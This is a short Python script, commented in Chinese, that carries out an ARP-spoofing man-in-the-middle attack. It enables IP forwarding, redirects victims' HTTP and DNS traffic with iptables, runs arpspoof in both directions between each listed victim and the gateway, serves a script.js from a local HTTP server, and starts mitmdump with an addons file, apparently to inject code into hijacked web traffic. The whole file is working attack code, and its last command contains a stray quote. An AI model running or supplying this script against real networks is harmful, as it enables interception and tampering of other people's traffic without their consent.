
'''
victims_ip:xxx.xxx.xxx.xxx
kali_ip:xxx.xxx.xxx.xxx
gateway:xxx.xxx.xxx.xxx
'''
import os
import sys

#get gateway_ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
# get victims_ip
victims = [line.rstrip('\n') for line in open("victims.txt")]
print("victims:")
print(victims)
#开启端口转发
os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
#iptables过滤数据包
os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888")
os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
#ARP做劫持攻击，将目标流量劫持到本机。目标机器IP，正反向劫持，数据包来，也得送走
for victim in victims:
    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
	
# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start the mitmproxy
os.system("mitmdump -s addons.py' -T")
